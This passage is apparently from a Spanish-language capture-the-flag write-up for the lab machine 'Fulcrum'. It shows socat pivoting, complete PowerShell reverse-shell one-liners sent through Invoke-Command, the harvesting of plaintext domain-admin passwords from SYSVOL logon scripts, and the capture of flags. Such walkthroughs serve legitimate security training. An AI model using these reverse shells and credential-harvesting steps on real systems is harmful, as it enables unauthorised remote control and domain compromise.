www-data@fulcrum:/tmp$ wget http://10.10.14.7/socat
www-data@fulcrum:/tmp$ chmod +x socat 
www-data@fulcrum:/tmp$ ./socat TCP-LISTEN:1111,fork TCP:10.10.14.7:444 &
```

Me mando la Reverse Shell con un OneLiner en PowerShell, primero a la máquina linux, para que haga el forwarding a mi equipo

```null
*Evil-WinRM* PS C:\Users> Invoke-Command -ComputerName file.fulcrum.local -Credential $Cred -ScriptBlock { $client = New-Object System.Net.Sockets.TCPClient('10.10.10.62',1111);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() }
```

Y gano acceso como este usuario

```null
rlwrap nc -nlvp 444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::444
Ncat: Listening on 0.0.0.0:444
Ncat: Connection from 10.10.10.62.
Ncat: Connection from 10.10.10.62:33796.

PS C:\Users\BTables\Documents> whoami
fulcrum\btables
PS C:\Users\BTables\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::7951:5c86:6630:5e64%3
   IPv4 Address. . . . . . . . . . . : 192.168.122.132
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.122.1
PS C:\Users\BTables\Documents> 
```

Puedo visualizar la primera flag

```null
PS C:\Users\BTables\Desktop> type user.txt
fce52521c8f872b514f037fada78daf4
```

Dentro de los recursos compartidos está IPC$

```null
PS C:\Users\BTables\Desktop> Get-SMBShare

Name   ScopeName Path Description  
----   --------- ---- -----------  
ADMIN$ *              Remote Admin 
C$     *              Default share
IPC$   *              Remote IPC 
```

Me autentico para ver el contenido

```null
PS C:\Users\BTables\Desktop> net use \\dc.fulcrum.local\IPC$ /user:FULCRUM\btables '++FileServerLogon12345++'
The command completed successfully.

PS C:\Users\BTables\Desktop> net view \\dc.fulcrum.local
Shared resources at \\dc.fulcrum.local



Share name  Type  Used as  Comment              

-------------------------------------------------------------------------------
NETLOGON    Disk           Logon server share   
SYSVOL      Disk           Logon server share   
The command completed successfully.
```

Creo una unidad lógica para trabajar más cómodamente

```null
PS C:\Users\BTables\Desktop> net use x: \\dc.fulcrum.local\SYSVOL
The command completed successfully.
```

Dentro del directorio X:\fulcrum.local\scripts hay una cantidad inmensa de scripts en powershell. Abro uno aleatorio para ver su contenido, suponiendo que todos siguen un patrón similar

```null
PS X:\fulcrum.local\scripts> type f5b83c5e-82a9-4316-ba06-3e3d12bfa671.ps1
# Map network drive v1.0
$User = 'b8c9'
$Pass = '@fulcrum_a7f9ef13a741_$' | ConvertTo-SecureString -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential ($User, $Pass)
New-PSDrive -Name '\\file.fulcrum.local\global\' -PSProvider FileSystem -Root '\\file.fulcrum.local\global\' -Persist -Credential $Cred
```

Como el usuario 923a es Administrador del Dominio, puedo tratar de filtrar por esa cadena y ver si encuentro su contraseña

```null
PS X:\fulcrum.local\scripts> Select-String -Path "X:\fulcrum.local\scripts\*.ps1" -Pattern 923a

3807dacb-db2a-4627-b2a3-123d048590e7.ps1:3:$Pass = '@fulcrum_df0923a7ca40_$' | ConvertTo-SecureString -AsPlainText -Force
a1a41e90-147b-44c9-97d7-c9abb5ec0e2a.ps1:2:$User = '923a'

S X:\fulcrum.local\scripts> type a1a41e90-147b-44c9-97d7-c9abb5ec0e2a.ps1
# Map network drive v1.0
$User = '923a'
$Pass = '@fulcrum_bf392748ef4e_$' | ConvertTo-SecureString -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential ($User, $Pass)
New-PSDrive -Name '\\file.fulcrum.local\global\' -PSProvider FileSystem -Root '\\file.fulcrum.local\global\' -Persist -Credential $Cred
```

Teniendo su contraseña, puedo volver a crear una PSCredential y ejecutar comandos con ScriptBlocks

```null
PS X:\fulcrum.local\scripts> $Pass = ConvertTo-SecureString '@fulcrum_bf392748ef4e_$' -AsPlainText -Force
PS X:\fulcrum.local\scripts> $Cred = New-Object System.Management.Automation.PSCredential('FULCRUM\923a', $Pass)
```

Con socat creo otro tunel para hacer pivoting

```null
www-data@fulcrum:/tmp$ ./socat TCP-LISTEN:1112,fork TCP:10.10.14.7:445 &
```

Me envío la reverse shell

```null
PS C:\Users\WebUser\Documents> PS C:\Users\WebUser\Documents> Invoke-Command -Computername dc.fulcrum.local -Credential $Cred -ScriptBlock { $client = New-Object System.Net.Sockets.TCPClient('10.10.10.62',1112);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() }
```

Y puedo ver la segunda flag

```null
rlwrap nc -nlvp 445
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::445
Ncat: Listening on 0.0.0.0:445
Ncat: Connection from 10.10.10.62.
Ncat: Connection from 10.10.10.62:40906.

PS C:\Users\923a\Documents> whoami
fulcrum\923a
PS C:\Users\923a\Documents> type C:\Users\Administrator\Desktop\root.txt
8ddbe372e57c019bb6c4cdb5b35a0cab
```